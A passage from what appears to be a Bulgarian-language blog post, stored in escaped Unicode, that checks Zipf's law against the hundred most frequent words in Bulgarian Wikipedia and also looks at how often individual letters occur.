\u043c\u0435\u0436\u0434\u0443 \u043d\u0435\u043d\u0443\u0436\u043d\u0430, \u043f\u043e\u0432\u0442\u0430\u0440\u044f\u0449\u0430 \u0441\u0435 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f (\u043d\u0438\u0441\u043a\u0430 \u0435\u043d\u0442\u0440\u043e\u043f\u0438\u044f) \u0438 \u043f\u0440\u0435\u043a\u0430\u043b\u0435\u043d\u043e \u043c\u043d\u043e\u0433\u043e \u0443\u043d\u0438\u043a\u0430\u043b\u043d\u0430 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f, \u043a\u043e\u044f\u0442\u043e \u043d\u0435 \u043c\u043e\u0436\u0435 \u0434\u0430 \u0431\u044a\u0434\u0435 \u0440\u0430\u0437\u0431\u0440\u0430\u043d\u0430 \u0438 \u0440\u0430\u0437\u0447\u0435\u0442\u0435\u043d\u0430 (\u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u043d\u0430 \u0435\u043d\u0442\u0440\u043e\u043f\u0438\u044f).\\n\\n### \u041c\u0435\u0442\u043e\u0434\\n\\n\u0421\u043b\u0435\u0434 \u043c\u0430\u043b\u043a\u043e \u0447\u0435\u0442\u0435\u043d\u0435 \u043f\u043e \u0432\u044a\u043f\u0440\u043e\u0441\u0430, \u0441\u0435 \u0437\u0430\u0438\u043d\u0442\u0440\u0438\u0433\u0443\u0432\u0430\u0445 \u0434\u0430 \u043d\u0430\u043f\u0440\u0430\u0432\u044f \u043c\u0430\u043b\u044a\u043a \u0442\u0435\u0441\u0442 \u043d\u0430 \u0442\u043e\u0437\u0438 \u0437\u0430\u043a\u043e\u043d, \u0438\u0437\u0432\u043b\u0438\u0447\u0430\u0439\u043a\u0438 \u0441\u0442\u043e\u0442\u0435 \u043d\u0430\u0439-\u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0434\u0443\u043c\u0438 \u0432 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0430\u0442\u0430 \u0432\u0435\u0440\u0441\u0438\u044f \u043d\u0430 \u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f, \u0438 \u043f\u0440\u0430\u0432\u0435\u0439\u043a\u0438 \u043b\u043e\u0433\u0430\u0440\u0438\u0442\u043c\u0438\u0447\u043d\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430 \u043d\u0430 \u0431\u0440\u043e\u044f \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0438 \u043d\u0430 \u0432\u0441\u044f\u043a\u0430 \u0434\u0443\u043c\u0430 \u0441\u043f\u0440\u044f\u043c\u043e \u043c\u044f\u0441\u0442\u043e\u0442\u043e \u045d \u0432 \u0441\u043f\u0438\u0441\u044a\u043a\u0430.\\n\\n\u0426\u0435\u043b\u0442\u0430 \u043d\u0430 \u0442\u043e\u0432\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430\u0442\u0430 \u0434\u0430 \u0435 \u043b\u043e\u0433\u0430\u0440\u0438\u0442\u043c\u0438\u0447\u043d\u0430, \u0435 \u0447\u0435 \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u043d\u0438\u0442\u0435 \u0437\u0430\u043a\u043e\u043d\u043e\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u0438 \u0438\u0437\u0433\u043b\u0435\u0436\u0434\u0430\u0442 \u043a\u0430\u0442\u043e \u043f\u0440\u0430\u0432\u0438 \u043b\u0438\u043d\u0438\u0438 \u043d\u0430 \u0442\u0430\u043a\u0430\u0432\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430, \u0438 \u0435 \u043c\u043d\u043e\u0433\u043e \u043b\u0435\u0441\u043d\u043e \u0434\u0430 \u0441\u0435 \u0432\u0438\u0434\u0438, \u0438\u043c\u0430 \u043b\u0438 \u0442\u0430\u043a\u0430\u0432\u0430 \u0437\u0430\u043a\u043e\u043d\u043e\u043c\u0435\u0440\u043d\u043e\u0441\u0442 \u0438\u043b\u0438 \u043d\u0435.\\n\\n\u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f \u0435 \u0443\u0434\u043e\u0431\u043d\u0430 \u0437\u0430 \u0442\u0430\u0437\u0438 \u0446\u0435\u043b, \u0442\u044a\u0439 \u043a\u0430\u0442\u043e \u0442\u0435 \u043f\u0430\u0437\u044f\u0442 \u0431\u0430\u043a\u044a\u043f \u043d\u0430 \u0442\u044f\u0445\u043d\u0430\u0442\u0430 \u0431\u0430\u0437\u0430 \u0434\u0430\u043d\u043d\u0438, \u043a\u043e\u0439\u0442\u043e \u0435 \u0441 \u043e\u0442\u043a\u0440\u0438\u0442 \u0434\u043e\u0441\u0442\u044a\u043f. \u0412\u0441\u0438\u0447\u043a\u0438 \u0442\u0435\u0437\u0438 \u0431\u0430\u043a\u044a\u043f\u0438 \u043c\u043e\u0433\u0430\u0442 \u0434\u0430 \u0441\u0435 \u043d\u0430\u043c\u0435\u0440\u044f\u0442 [\u0442\u0443\u043a](https://dumps.wikimedia.org/backup-index.html) \u0417\u0430 \u0446\u0435\u043b\u0442\u0430 \u0431\u044f\u0445 \u0440\u0435\u0448\u0438\u043b \u0434\u0430 \u043d\u0430\u043f\u0438\u0448\u0430 \u043c\u0430\u043b\u043a\u043e \u043a\u043e\u0434, \u043a\u043e\u0439\u0442\u043e \u0434\u0430 \u043f\u0430\u0440\u0441\u0432\u0430 \u043e\u0442 xml \u0444\u0430\u0439\u043b\u0430 \u043d\u0430 \u0431\u0430\u043a\u044a\u043f\u0430 \u0432\u0441\u0438\u0447\u043a\u0438 \u0434\u0443\u043c\u0438, \u0438 \u0434\u0430 \u0433\u0438 \u0434\u043e\u0431\u0430\u0432\u044f \u0432 \u0440\u0435\u0447\u043d\u0438\u043a \u0437\u0430\u0435\u0434\u043d\u043e \u0441 \u0431\u0440\u043e\u044f \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0438 \u043d\u0430 \u0434\u0430\u0434\u0435\u043d\u0430\u0442\u0430 \u0434\u0443\u043c\u0430.\\n\\n\u0421\u043b\u0435\u0434 \u0431\u044a\u0440\u0437 \u0433\u0443\u0433\u044a\u043b, \u043e\u0442\u043a\u0440\u0438\u0445 \u0447\u0435 \u0442\u043e\u0432\u0430 \u0432\u0435\u0447\u0435 \u0435 \u043d\u0430\u043f\u0440\u0430\u0432\u0435\u043d\u043e \u043f\u0440\u0435\u0437 \u0434\u0430\u043b\u0435\u0447\u043d\u0430\u0442\u0430 2011-\u0442\u0430 \u0433\u043e\u0434\u0438\u043d\u0430, \u0438 \u0440\u0435\u0448\u0438\u0445 \u0434\u0430 \u0441\u0435 \u0438\u0437\u043c\u044a\u0440\u0437\u0435\u043b\u044f, \u0438 \u0434\u0430 \u0432\u0437\u0435\u043c\u0430 \u043d\u0430\u0433\u043e\u0442\u043e\u0432\u043e \u0441\u043f\u0438\u0441\u044a\u043a\u0430 \u0441\u044a\u0441 \u0441\u0442\u043e\u0442\u0435 \u043d\u0430\u0439-\u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438 \u0434\u0443\u043c\u0438 \u0432\u044a\u0432 \u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f \u043f\u0440\u0435\u0437 2011-\u0442\u0430 \u0433\u043e\u0434\u0438\u043d\u0430 \u043e\u0442 [\u0442\u043e\u0437\u0438](http://nikolay.it/Blog/2011/08/%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7-%D0%BD%D0%B0-%D0%B1%D1%8A%D0%BB%D0%B3%D0%B0%D1%80%D1%81%D0%BA%D0%B8%D1%8F-%D0%B5%D0%B7%D0%B8%D0%BA-%D1%87%D1%80%D0%B5%D0%B7-Wikipedia/3)  \u043f\u043e\u0441\u0442.\\n\\n\u0410\u043a\u043e \u0440\u0435\u0448\u0430 \u0434\u0430 \u0437\u0430\u0434\u044a\u043b\u0431\u043e\u0447\u0430 \u043c\u0430\u043b\u043a\u043e \u043f\u0440\u043e\u0443\u0447\u0432\u0430\u043d\u0435\u0442\u043e \u043d\u0430 \u0442\u0435\u0437\u0438 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438, \u0441\u044a\u0441 \u0441\u0438\u0433\u0443\u0440\u043d\u043e\u0441\u0442 \u0449\u0435 \u043d\u0430\u043f\u0438\u0448\u0430 \u0441\u043e\u0431\u0441\u0442\u0432\u0435\u043d \u043f\u0430\u0440\u0441\u044a\u0440, \u0437\u0430 \u0434\u0430 \u0438\u043c\u0430\u043c \u043f\u043e-\u0433\u043e\u043b\u044f\u043c \u043a\u043e\u043d\u0442\u0440\u043e\u043b \u043d\u0430\u0434 \u0434\u0430\u043d\u043d\u0438\u0442\u0435, \u043d\u043e \u0437\u0430 \u0446\u0435\u043b\u0442\u0430 \u0442\u043e\u0437\u0438 \u043d\u0430 \u041d\u0438\u043a\u043e\u043b\u0430\u0439 \u043c\u0438 \u0441\u0432\u044a\u0440\u0448\u0438 \u0438\u0434\u0435\u0430\u043b\u043d\u0430 \u0440\u0430\u0431\u043e\u0442\u0430. \u0414\u043e\u0431\u0440\u0435 \u0435 \u0434\u0430 \u0438\u043c\u0430 \u0445\u043e\u0440\u0430 \u0437\u0430\u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043e\u0432\u0430\u043d\u0438 \u0432 \u0441\u044a\u0449\u0438\u0442\u0435 \u043a\u0430\u0442\u043e \u0442\u0435\u0431 \u0441\u0442\u0440\u0430\u043d\u043d\u043e\u0441\u0442\u0438.\\n\\n\u0412\u0441\u0438\u0447\u043a\u043e \u043a\u043e\u0435\u0442\u043e \u043e\u0441\u0442\u0430\u0432\u0430 \u0434\u0430 \u0441\u0435 \u043d\u0430\u043f\u0440\u0430\u0432\u0438, \u0435 \u0434\u0430 \u0441\u0435 \u0432\u0437\u0435\u043c\u0430\u0442 \u0434\u0430\u043d\u043d\u0438\u0442\u0435 \u0438 \u0434\u0430 \u0441\u0435 \u0442\u0438\u043a\u043d\u0430\u0442 \u0432 \u0433\u0440\u0430\u0444\u0438\u043a\u0430\u0442\u0430. \u0417\u0430 \u0446\u0435\u043b\u0442\u0430 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u0445 [gnuplot](http://gnuplot.sourceforge.net/).\\n\\n### \u0410\u043d\u0430\u043b\u0438\u0437 \u043d\u0430 \u0434\u0430\u043d\u043d\u0438\u0442\u0435\\n\\n\u0418\u0437\u0431\u043e\u0440\u044a\u0442 \u043d\u0430 \u0441\u0430\u043c\u043e 100-\u0442\u0435 \u043d\u0430\u0439-\u043f\u043e\u043f\u0443\u043b\u044f\u0440\u043d\u0438 \u0434\u0443\u043c\u0438 \u043d\u043e\u0441\u0438 \u0441\u044a\u0441 \u0441\u0435\u0431\u0435 \u0441\u0438 \u0435\u0434\u0438\u043d \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d \u0431\u043e\u043d\u0443\u0441. \u0412 \u043f\u043e\u0447\u0442\u0438 \u0432\u0441\u0438\u0447\u043a\u0438 \u0435\u0437\u0438\u0446\u0438, \u043f\u044a\u0440\u0432\u0438\u0442\u0435 20-\u043d\u0430 \u0434\u0443\u043c\u0438 (\u0438\u043b\u0438 \u043f\u043e\u0432\u0435\u0447\u0435) \u0441\u043b\u0435\u0434\u0432\u0430\u0442 \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u043d\u0430\u0442\u0430 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442 \u0441 \u043f\u043e-\u043c\u0430\u043b\u043a\u0430 \u0442\u043e\u0447\u043d\u043e\u0441\u0442, \u0438 \u0434\u043e\u043f\u0440\u0438\u043d\u0430\u0441\u044f\u0442 \u0437\u0430 \u043c\u0430\u043b\u043a\u043e \u0440\u0430\u0437\u043d\u043e\u043e\u0431\u0440\u0430\u0437\u0438\u0435 \u0432 \u0438\u043d\u0430\u0447\u0435 \u0441\u043a\u0443\u0447\u043d\u0430\u0442\u0430 \u043b\u0438\u043d\u0435\u0439\u043d\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430.\\n\\n\u041d\u043e \u0434\u043e\u0440\u0438 \u0432 \u0442\u043e\u0437\u0438 \u0441\u043b\u0443\u0447\u0430\u0439 \u0433\u0435\u043d\u0435\u0440\u0430\u043b\u043d\u043e \u0441\u0435 \u0432\u0438\u0436\u0434\u0430 \u044f\u0441\u043d\u043e \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u043d\u0430\u0442\u0430 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442 \u043c\u0435\u0436\u0434\u0443 \u0440\u0430\u043d\u043a\u0430 \u043d\u0430 \u0434\u0443\u043c\u0430\u0442\u0430 \u0432 \u043d\u0430\u0448\u0438\u044f \u0442\u043e\u043f \u0441\u0442\u043e, \u0438 \u0447\u0435\u0441\u0442\u043e\u0442\u0430\u0442\u0430 \u045d \u043d\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430.\\n\\n![100-\u0442\u0435 \u043d\u0430\u0439-\u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0434\u0443\u043c\u0438 \u0432 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0430\u0442\u0430 \u0423\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f](/content/images/2016/11/zipfs_law.png)\\n\\n\u0417\u0430 \u043f\u044a\u043b\u043d\u043e\u0442\u0430, \u0435\u0442\u043e \u0438 \u0441\u0430\u043c\u0438\u044f\u0442 \u0441\u043f\u0438\u0441\u044a\u043a \u0434\u0443\u043c\u0438 \u043a\u043e\u0439\u0442\u043e \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u0445 \u0437\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430\u0442\u0430, \u043f\u043e\u0434\u0440\u0435\u0434\u0435\u043d\u0438 \u043f\u043e \u0447\u0435\u0441\u0442\u043e\u0441\u0442 \u043d\u0430 \u043f\u043e\u044f\u0432\u0430, \u0441\u044a\u0449\u043e \u043a\u0430\u0442\u043e \u0432 \u0433\u0440\u0430\u0444\u0438\u043a\u0430\u0442\u0430:\\n\\n> \u043d\u0430, \u0438, \u0432, \u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b, \u0435, \u043e\u0442, \u0437\u0430, \u0441\u0435, \u043f\u0440, \u0431\u0435\u0441\u0435\u0434\u0430, \u0431, \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u043d\u0438, \u043f\u0440\u0438\u043d\u043e\u0441\u0438, \u0441, \u0434\u0430, \u0433, \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f, \u043f\u043e, \u043f\u0440\u0435\u0437, \u0441\u0430, \u043a\u0430\u0442\u043e, \u0430, \u0441\u0438, \u043d\u0435, \u0433\u043e\u0434\u0438\u043d\u0430, \u0434\u043e, \u0431\u044a\u043b\u0433\u0430\u0440\u0438\u044f, \u0448\u0430\u0431\u043b\u043e\u043d, \u0447\u0435, \u0441\u043b\u0435\u0434, \u0438\u043c\u0435, \u0442\u043e\u0432\u0430, \u043c\u0443, \u043f\u0440\u0438, \u043d\u0430\u0439, \u043a\u044a\u043c, \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438, \u0435\u0437\u0438\u043a, \u0438\u043b\u0438, \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0430, \u0444\u043b\u0430\u0433, \u0438\u043c\u0430, \u043a\u043e\u0438\u0442\u043e, \u043d\u043e, \u0434\u0430\u0442\u0430, \u043c\u044f\u0441\u0442\u043e, \u0442\u043e\u0439, \u0441\u043e\u0444\u0438\u044f, \u043a\u043e\u0439\u0442\u043e, \u043c\u044a\u043d\u0438\u0447\u0435, \u0433\u0440\u0430\u0434, \u043d, \u0440\u043e\u0434\u0435\u043d, \u0442\u0435, \u043e\u0431\u0449\u0438\u043d\u0430, \u0432\u044a\u0432, \u043e\u0431\u043b\u0430\u0441\u0442, \u0438\u043a\u043e\u043d\u0430, \u0432\u0440\u0435\u043c\u0435, \u0433\u043e\u0434\u0438\u043d\u0438, \u043c\u0430\u043a\u0435\u0434\u043e\u043d\u0438\u044f, \u0432\u043e\u0439\u043d\u0430, \u0447\u0430\u0441\u0442, \u0432\u0438\u0436, \u0432\u0435\u043a, \u043d\u0430\u0441\u0435\u043b\u0435\u043d\u0438\u0435, \u043a\u043e\u0435\u0442\u043e, \u0441\u0435\u043b\u043e, \u043a\u043e\u044f\u0442\u043e, \u0441\u044a\u0441, \u043c\u043d\u043e\u0433\u043e, \u0441\u0430\u0449, \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435, \u0434\u0440\u0443\u0433\u0438, \u043c\u043e\u0436\u0435, \u043e\u043a\u0440\u044a\u0433, \u043a\u043e\u0434, \u0443\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f, \u043f\u0440\u0435\u043f\u0440\u0430\u0442\u043a\u0438, \u0435\u0434\u0438\u043d, \u0438\u0441\u0442\u043e\u0440\u0438\u044f, \u0432\u044a\u043d\u0448\u043d\u0438, \u0441\u044a\u0449\u043e, \u0430\u043c\u0435\u0440\u0438\u043a\u0430\u043d\u0441\u043a\u0438, \u0442\u043e\u0437\u0438, \u0432\u0438\u0434, \u0432\u0441\u0438\u0447\u043a\u0438, \u043e\u043a\u043e\u043b\u043e, \u0442\u0430, \u043c\u0435\u0436\u0434\u0443, \u043e\u0442\u0431\u043e\u0440, \u043e\u0449\u0435, \u043f\u043e\u0447\u0438\u043d\u0430\u043b, \u043a\u0430\u0440\u0442\u0430, \u0433\u0440\u0443\u043f\u0430, \u0438\u043d\u0444\u043e, \u0441\u0442\u0440\u0430\u043d\u0430, \u0441\u0435\u043b\u043e\u0442\u043e, \u0441\u0430\u043c\u043e, \u0433\u043e\\n\\n\u041a\u0430\u043a\u0442\u043e \u0441\u0435 \u0432\u0438\u0436\u0434\u0430, \u043e\u0441\u0432\u0435\u043d \u043e\u0447\u0430\u043a\u0432\u0430\u043d\u0438\u0442\u0435 \u043d\u0430\u0439-\u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0434\u0443\u043c\u0438 \u043f\u043e\u0434 \u0444\u043e\u0440\u043c\u0430\u0442\u0430 \u043d\u0430 \u043f\u0440\u0435\u0434\u043b\u043e\u0437\u0438 \u0438 \u0441\u044a\u044e\u0437\u0438, \u0441\u0435 \u043d\u0430\u043c\u0438\u0440\u0430\u0442 \u0438 \u043d\u044f\u043a\u043e\u0438 \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u0438 \u043f\u043e\u043f\u044a\u043b\u043d\u0435\u043d\u0438\u044f \u043a\u0430\u0442\u043e \\"\u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b\\". \u0422\u0435\u0437\u0438 \u043d\u0430\u043f\u044a\u043b\u043d\u043e \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u043d\u043e-\u0437\u0430\u0432\u0438\u0441\u0438\u043c\u0438 \u0434\u0443\u043c\u0438 - \u043a\u043e\u0438\u0442\u043e \u0441\u0430 \u0442\u0443\u043a \u0441\u0430\u043c\u043e \u0437\u0430\u0440\u0430\u0434\u0438 \u0444\u0430\u043a\u0442\u0430, \u0447\u0435 \u0442\u043e\u0432\u0430 \u0441\u0430 \u0441\u0442\u0430\u0442\u0438\u0438 \u043e\u0442 \u0432\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f, \u043f\u043e \u043d\u0438\u043a\u0430\u043a\u044a\u0432 \u043d\u0430\u0447\u0438\u043d \u043d\u0435 \u043d\u0430\u0440\u0443\u0448\u0430\u0432\u0430\u0442 \u0437\u0430\u043a\u043e\u043d\u0430 \u043d\u0430 \u0417\u0438\u0444, \u0438 \u0441\u0430\u043c\u043e \u0434\u043e\u043f\u0440\u0438\u043d\u0430\u0441\u044f\u0442 \u0437\u0430 (\u043d\u0435)\u043e\u0447\u0430\u043a\u0432\u0430\u043d\u0430\u0442\u0430 \u043b\u0438\u043d\u0435\u0439\u043d\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430.\\n\\n### \u0410\u0442\u043e\u043c\u0435\u043d \u0430\u043d\u0430\u043b\u0438\u0437\\n\\n\u041a\u0430\u0442\u043e \u0431\u043e\u043d\u0443\u0441 \u0440\u0435\u0448\u0438\u0445 \u0434\u0430 \u043d\u0430\u043f\u0440\u0430\u0432\u044f \u043f\u043e\u0434\u043e\u0431\u043d\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430 \u0438 \u0441 \u0434\u0430\u043d\u043d\u0438\u0442\u0435 \u0437\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430 \u043d\u0430 \u0431\u0443\u043a\u0432\u0438\u0442\u0435 \u0432 \u0441\u044a\u0449\u0438\u0442\u0435 \u0442\u0435\u0437\u0438 \u0441\u0442\u0430\u0442\u0438\u0438:\\n\\n![\u0410\u043d\u0430\u043b\u0438\u0437 \u043d\u0430 \u0431\u0443\u043a\u0432\u0438\u0442\u0435](/content/images/2016/11/bukvi.png)\\n\\n\u041a\u0430\u043a\u0432\u043e \u0441\u0435 \u0441\u043b\u0443\u0447\u0432\u0430 \u0442\u0443\u043a? \u041e\u0442 \u0435\u0434\u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0430 \u0438\u0437\u0433\u043b\u0435\u0436\u0434\u0430, \u0447\u0435 \u0437\u0430\u043a\u043e\u043d\u044a\u0442 \u043d\u0430 \u0417\u0438\u0444 \u043d\u0435 \u0441\u0435 \u0441\u043b\u0435\u0434\u0432\u0430 \u0432 \u0442\u043e\u0437\u0438 \u0441\u043b\u0443\u0447\u0430\u0439, \u043d\u043e \u043e\u0442 \u0434\u0440\u0443\u0433\u0430 \u0441\u0442\u0440\u0430\u043d\u0430 \u0441\u0435 \u0441\u043b\u0443\u0447\u0432\u0430 \u043d\u0435\u0449\u043e \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u043e, \u043a\u043e\u0435\u0442\u043e \u043f\u0440\u0430\u0432\u0438 \u0442\u0430\u0437\u0438 \u0433\u0440\u0430\u0444\u0438\u043a\u0430 \u0434\u043e\u0440\u0438 \u043f\u043e-\u043b\u044e\u0431\u043e\u043f\u0438\u0442\u043d\u0430 \u043e\u0442 \u043f\u0440\u0435\u0434\u0438\u0448\u043d\u0430\u0442\u0430.\\n\\n\u0413\u0435\u043d\u0435\u0440\u0430\u043b\u043d\u043e \u0432\u0441\u0435 \u043e\u0449\u0435 \u0438\u0437\u0433\u043b\u0435\u0436\u0434\u0430 \u0441\u044f\u043a\u0430\u0448 \u0447\u0435\u0441\u0442\u043e\u0442\u0430\u0442\u0430 \u043d\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430 \u043d\u0430 \u0431\u0443\u043a\u0432\u0438 \u0441\u043b\u0435\u0434\u0432\u0430 \u043d\u044f\u043a\u0430\u043a\u0432\u0430 \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u043d\u0430 \u0437\u0430\u043a\u043e\u043d\u043e\u043c\u0435\u0440\u043d\u043e\u0441\u0442, \u043c\u0430\u043a\u0430\u0440 \u0438 \u043d\u0435 \u0438\u0434\u0435\u0430\u043b\u043d\u0430, \u0441 \u043e\u0447\u0435\u0432\u0430\u0434\u043d\u043e\u0442\u043e \u0438\u0437\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u0442\u0435 \u0434\u0432\u0435 \u0431\u0443\u043a\u0432\u0438 - \u044e \u0438 \u044c. \u0422\u0435\u0437\u0438 \u0434\u0432\u0435 \u0431\u0443\u043a\u0432\u0438 \u0438\u0437\u0433\u043b\u0435\u0436\u0434\u0430 \u0434\u043e\u0441\u0442\u0430 \u0441\u0435 \u0438\u0433\u043d\u043e\u0440\u0438\u0440\u0430\u0442 \u0432 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\u044f \u0435\u0437\u0438\u043a. \u0418\u043c\u0430\u0439\u043a\u0438 \u043f\u0440\u0435\u0434\u0432\u0438\u0434, \u0447\u0435 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\u044f\u0442 \u0435 \u0441\u0440\u0435\u0434 \u043d\u0430\u0439-\u0442\u0432\u044a\u0440\u0434\u0438\u0442\u0435 \u0441\u043b\u0430\u0432\u044f\u043d\u0441\u043a\u0438 \u0435\u0437\u0438\u0446\u0438, \u043d\u0438\u0435 \u043d\u0430\u0438\u0441\u0442\u0438\u043d\u0430 \u043d\u0435 \u043d\u0430\u043c\u0438\u0440\u0430\u043c\u0435 \u0433\u043e\u043b\u044f\u043c\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430 \u043d\u0430 \u0431\u0443\u043a\u0432\u0430\u0442\u0430 \u044c. \u0418\u0437\u0432\u044a\u043d \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\u044f \u0442\u044f \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u0437\u0430 \u0441\u043c\u0435\u043a\u0447\u0430\u0432\u0430\u043d\u0435 \u043d\u0430 \u043f\u0440\u0435\u0434\u0445\u043e\u0434\u043d\u0430\u0442\u0430 \u0441\u044a\u0433\u043b\u0430\u0441\u043d\u0430, \u0434\u043e\u043a\u0430\u0442\u043e \u0432 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\u044f \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u043f\u0440\u0435\u0434\u0438\u043c\u043d\u043e \u0432 \u043a\u043e\u043c\u0431\u0438\u043d\u0430\u0446\u0438\u044f \u0441 \u043e \u0432 \u044c\u043e. \u0412 \u043f\u043e-\u0440\u044f\u0434\u043a\u043e \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438\u0442\u0435 \u0431\u0443\u043a\u0432\u0438 \u0441\u0430 \u0438 \u0445, \u0444, \u0448, \u0449. \u0429, \u043f\u043e\u0434\u043e\u0431\u043d\u043e \u043d\u0430 \u044e \u0435 \u043a\u043e\u043c\u043f\u043e\u0437\u0438\u0442\u0435\u043d \u0437\u0432\u0443\u043a, \u0438 \u0435 \u043d\u043e\u0440\u043c\u0430\u043b\u043d\u043e \u0434\u0430 \u043d\u0435 \u0441\u0435 \u0441\u0440\u0435\u0449\u0430 \u0442\u043e\u043b\u043a\u043e\u0432\u0430 \u0447\u0435\u0441\u0442\u043e \u043a\u043e\u043b\u043a\u043e\u0442\u043e \u043e\u0441\u0442\u0430\u043d\u0430\u043b\u0438\u0442\u0435. \u0424 \u0435 \u043f\u0440\u0438\u043c\u0435\u0440 \u0437\u0430 \u0431\u0443\u043a\u0432\u0430, \u043a\u043e\u044f\u0442\u043e \u0438\u0441\u0442\u043e\u0440\u0438\u0447\u0435\u0441\u043a\u0438 \u0435 \u0431\u0438\u043b\u0430 \u0434\u043e\u0431\u0430\u0432\u0435\u043d\u0430, \u0437\u0430 \u0434\u0430 \u0430\u043a\u043e\u043c\u043e\u0434\u0438\u0440\u0430 \u0433\u0440\u044a\u0446\u043a\u0438 \u0434\u0443\u043c\u0438 \u0432 \u0431\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\u044f \u0435\u0437\u0438\u043a. \u0415\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043e, \u0441 \u0432\u0440\u0435\u043c\u0435\u0442\u043e \u0431\u0443\u043a\u0432\u0430\u0442\u0430 \u0435 \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u043b\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u0442\u0430 \u0441\u0438, \u043d\u043e \u0432\u044a\u043f\u0440\u0435\u043a\u0438 \u0442\u043e\u0432\u0430 \u043d\u0435 \u0435 \u0438\u0441\u043a\u043e\u043d\u043d\u043e \u043d\u0430\u0448 \u0437\u0432\u0443\u043a.\\n\\n### \u0417\u0430\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\\n\\n\u041a\u0430\u0442\u043e \u0446\u044f\u043b\u043e \u0442\u0435\u0437\u0438 \u0434\u0430\u043d\u043d\u0438 \u043c\u043e\u0433\u0430\u0442 \u0434\u0430 \u0441\u043b\u0443\u0436\u0430\u0442 \u0437\u0430 \u043c\u043d\u043e\u0433\u043e \u0432\u0438\u0434\u043e\u0432\u0435 \u0430\u043d\u0430\u043b\u0438\u0437. \u0423\u0431\u0435\u0434\u0435\u043d \u0441\u044a\u043c, \u0447\u0435 \u0438\u043c\u0430 \u0445\u043e\u0440\u0430 \u043a\u043e\u0438\u0442\u043e \u0441\u0435 \u0437\u0430\u043d\u0438\u043c\u0430\u0432\u0430\u0442 \u0441 \u0442\u043e\u0432\u0430, \u043d\u043e \u043c\u0430\u043b\u043a\u043e\u0442\u043e \u043c\u0438 \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e \u0432\u0440\u0435\u043c\u0435 \u0438 \u0433\u043e\u043b\u044f\u043c\u043e\u0442\u043e \u043c\u0438 \u043b\u044e\u0431\u043e\u043f\u0438\u0442\u0441\u0442\u0432\u043e \u043c\u0435 \u0434\u043e\u0432\u0435\u0434\u0435 \u0434\u043e 